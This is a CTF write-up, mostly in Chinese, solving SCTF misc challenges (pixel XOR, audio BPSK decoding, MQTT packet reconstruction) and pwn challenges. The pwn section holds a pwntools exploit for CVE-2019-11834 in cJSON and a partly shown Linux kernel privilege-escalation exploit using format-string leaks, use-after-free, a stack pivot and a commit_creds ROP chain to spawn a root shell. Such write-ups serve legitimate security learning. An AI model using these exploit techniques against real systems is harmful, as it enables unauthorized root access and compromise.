然后中文转二进制：
010000110110100000110001011011100100000101011111011110010111100101100100011100110010000100
二进制转出ascii
Ch1nA_yyds!
###  fumo_xor_cli
> nc 124.70.150.39 2333
>
> nc 123.60.107.154 2333
>
> FUMOFUMO FUMO FUMOFUMO?(flag中没有数字)
Fumo 中间夹着两段彩色的文字，其中一部分包含一个链接
里面有张图
按照题目名称的意思，提取这里面的每个像素点，和 cli 里面的那个进行异或
图片中一行100个 总共 13300 个色块
Shell 里拿 pwntools 接收 提取出来有 6650 个字符，正好2倍
图里这个顺序正好和shell里第二段五颜六色的字符颜色顺序一样，异或之后发现前6650位几乎完全一致，后面不一样
后面那一半和 cli 前面那部分彩色的颜色（aaaaa….）来异或
Exp:
    # MiaoTony
    # from pwn import *
    # host = '124.70.150.39'
    # port = 2333
    # r = remote(host, port)
    # s = r.recvall()
    # print(s[:100])
    # print(s[-100:])
    # with open('data', 'wb') as f:
    #     f.write(s)
    import re
    from PIL import Image
    img = Image.open('TpMSkq.png')
    # img.show()
    img.size
    # (900, 1200)
    # 纵向来提取
    data = []
    for i in range(1, img.size[0], 9):
        for j in range(1, img.size[1]-9, 9):
            r, g, b, a = img.getpixel((i, j))
            print(r, g, b, a)
            data.append((r, g, b))
    # print(data)
    print(len(data))
    # 13300
    with open('colors2', 'w', encoding='utf-8') as f:
        f.write(str(data))
    with open('data2.txt', 'rb') as f:
        s = f.read()
    with open('data1.txt', 'rb') as f:
        s += f.read()
    # print(s)
    # s[:100]
    l = re.findall(b'\x1b\[38;2;(\d+);(\d+);(\d+)m', s)
    # print(l)
    colors = [tuple(int(i) for i in j) for j in l]
    print(len(colors))
    # 6650
    data_new = []
    for i in range(len(colors)):
        x = ()
        for j in range(3):
            tmp = data[i][j] ^ colors[i][j]
            x += (tmp,)
        print(x)
        data_new.append(x)
    with open('data_xor.txt', 'w') as f:
        f.write(str(data_new))
    img1 = Image.new('RGB', (133, 100), (255, 255, 255))
    img1.putdata(data_new)
    img1.save('out.png')
    img1.show()
翻转旋转一下得到 flag
SCTF{Good_FuMo_CTF_OvO}
###  in_the_vaporwaves
> something in the vaporwaves(题目flag格式为 SCTF(. _) 请自行加上花括号为 SCTF{._ } 提交)
>
> 附件链接：
>
> 提取码：sctf
修改频谱大一点 mose解密
###  easydsp
题目附件包含 4 个数据文件，每个数据文件为 126000 个浮点数。参考题目描述，将数据文件按照音频文件理解，转换为 wav
（适当压缩幅度），可以听到四段音乐混合不同类型的杂音。考虑到样本点幅度超过了 -1 ~ 1
的范围，猜测出题人可能将两段音频文件直接加在了一起，因此尝试了一下计算 data1 – data2 的结果，画图如下
可以从差值中看出采用了类似 BPSK 调制方式进行编码，周期为 1000 个采样点。完整的文件可以编码 126 bit 内容。126 不是 8 的倍数，是
7 的倍数，猜测有可能是使用 7bit 编码一个字符的方式。一些尝试后可还原出 flag 的内容。
    data = []
    for i in range(1, 5):
        data.append(np.array(list(map(float, open(f'data{i}.txt').read().strip().splitlines()))))
    diff = data[0] - data[1]
    def get_bit(x):
        return 1 if np.sum(x[200:300]) / 100 > 0 else 0
    bits = [get_bit(diff[d:d + 1000]) for d in range(0, 126000, 1000)]
    print(bits)
    t = 0
    flag = []
    for i in range(0, len(bits)):
        t = (t  Congratulations on helping B find the device tree plug-in,Here are some
> tips, Embedded Engineer A, wants to send a message requesting a connection
> to the server using an IoT device Distribute up to once, and the server
> clears the session after it receives it, and the server kicks the device off
> after more than 2 minutes of idleness.This message appears on the screen of
> the IoT device (read as normal) Can you get the data that A enters into the
> IoT device? (Remember to put “sctf{}” on it)
逆向内核模块逻辑可得 user password 内容为 `chengdu106520013` （AES 解密），以及一个比较正常的 LED
显示输出的逻辑（可以从
找到修改前的源码）。
仅通过 device_tree.txt 的内容没有脑洞出来这些和 flag 的关系是怎样的。。。在看到 hint 给出的 message 之后，可以看到
MQTT 相关的信息，猜测可能是想把 MQTT 报文内容作为 flag 提交。在一番与出题人确认信息后（比如相比标准协议少掉一个字节是什么情况），又注意到
LED 输出的部分排序方式与正常不太一样，驱动中实现的是逐列输出，如果想“正常读出”的话需要做转置。多次尝试后终于拼出了正确的 flag。
    from pwn import *
    import binascii
    context.endian = 'big'
    client_id = b"21"
    user = b'A'
    password = b'chengdu106520013'
    datalen = 10 + len(client_id) + 2 + len(user) + 2 + len(password) + 2 - 1
    buf = b"\x10" + bytes([datalen, 4]) + b'MQTT' + b"\x04" + b"\xc2\x00\x50" + p16(len(client_id)) + client_id + p16(len(user)) + user + p16(len(password)) + password
    pkt = binascii.hexlify(buf).upper().decode()
    reorder = ''
    for j in range(0, 12):
        for i in range(0, len(pkt), 12):
            reorder += pkt[i + j]
    flag = 'sctf{' + reorder + '}'
    print(flag)
## Pwn
###  dataleak
CVE-2019-11834 直接泄露即可
    from pwn import *
    # sh = process('./cJSON_PWN')
    sh= remote('124.70.202.226',2101)
    # gdb.attach(sh,'b * $rebase(0x120d)')
    payload = "/*".rjust(0xe,'b')
    # payload = payload.ljust(0xe,'a')
    sh.send(payload)
    sh.send("aaaa/*".ljust(0xe,'a'))
    payload = "b" * (0xb-6) +"/*"
    payload = payload.ljust(0xe,'a')
    sh.send(payload)
    sh.send("/*".ljust(0xe,'a'))
    sh.interactive()
###  flyingkernel
This was the only kernel challenge for SCTF this year.
The vulnerable device driver was /dev/seven.
They were multiple vulnerabilities that when combined can lead to LPE.
You can allocate a chunk of size 0x80 using the command `0x5555` in ioctl.
Using the command `0x6666` you can get that chunk freed but not nulled (UAF).
The last ioclt command was `0x7777` we can use this to get format string
attack and bypass KASLR.
And the most important thing is that SMAP is disabled, which means if we can
get our leaks using
the format string attack and then get RIP, we can pivot our stack and just ROP
; commit_creds(prepare_kernel_cred(0)) and swapgs iretq.
So now we have UAF on a chunk with size 0x80, which means it will get the
chunk from kmalloc-128
The problem is that there are not much structs we can target for this specific
slab.
But good for use there is `struct subprocess_info` which can give RIP control.
    struct subprocess_info {
            struct work_struct work;
            struct completion *complete;
            const char *path;
            char **argv;
            char **envp;
            int wait;
            int retval;
            int (*init)(struct subprocess_info *info, struct cred *new);
            void (*cleanup)(struct subprocess_info *info);
            void *data;
    } __randomize_layout;
if we can control `cleanup` we can control rip (but we have to be quick, this
struct is allocated and it uses cleanup quickly).
You can allocate this struct just using this line of code : socket(22,
AF_INET, 0); it’s okey if it fails and return -1 it will still be allocated.
So the plan is this:
  * Take advantage of the format string vuln to get leaks (don’t use %p they are detected by the kernel as information leak and it will show up as **_ptr_** and not the actual value in my exploit I provided %lld) and now we have the kernel base.
  * Free that chunk and execute that socket() to get advantage of the UAF and overwrite cleanup with a gadget, in my case it was
    0xffffffff816e19bc:        mov    esp,0x83000000
    0xffffffff816e19c1:        ret
  * I mentioned that we should be quick to overwrite that (so that our gadget gets executed and not the actual cleanup value). userfault_fd was not available to make the race reliable. What I did was I spawned a thread which write to /dev/seven in infinite loop, and hope for cleanup to be overwritten before use.
  * mmap that region of memory and put our ROP there, elevate our privs and execute shell.
The complete exploit:
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int fd;
    // We can launch ioctl / read / write for this device driver.
    // For ioctl command we have:
    // 0x6666 for UAF
    // 0x7777 for Fmt string vuln
    // 0x5555 alloc of size 0x80
    #define ALLOC         0x5555
    #define UAF                0x6666
    #define GET                0x7777
    struct trap_frame{
            char* rip;
            unsigned long cs;
            unsigned long rflags;
            char* rsp;
            unsigned long ss;
    }__attribute__((packed));
    struct trap_frame tf;
    void save_state(void){
            asm volatile(   "mov tf+8, cs;"
                            "pushf;"
                            "pop tf+16;"
                            "mov tf+24, rsp;"
                            "mov tf+32, ss;"
                            );
    }
    void open_target(void)
    {
            fd = open("/dev/seven", O_RDWR);
            assert(fd > 0);
    }
    int lock;
    void *memset_buf(void *tmp)
    {
            unsigned long buf[4];
            for(int i = 0; i < 4; i++){
                    buf[i] = (unsigned long)tmp;
            }
            /*
            char buf[0x81];
            memset(buf, 'M', 0x80);
            */
            lock = 1;
            while(1)
            {
                    write(fd, buf, 0x20);
            }
            return tmp;
    }
    void shell(void){
            char* argv[] = {"/bin/sh", NULL};
            execve(argv[0], argv, NULL);
    }
    void setup_chunk_rop(unsigned long kernel_base)
    {
            unsigned long *rop;
            int i = (0x1000000/2)/8;
            unsigned long commit_creds = kernel_base + (0xffffffff8108c360 - 0xffffffff81000000);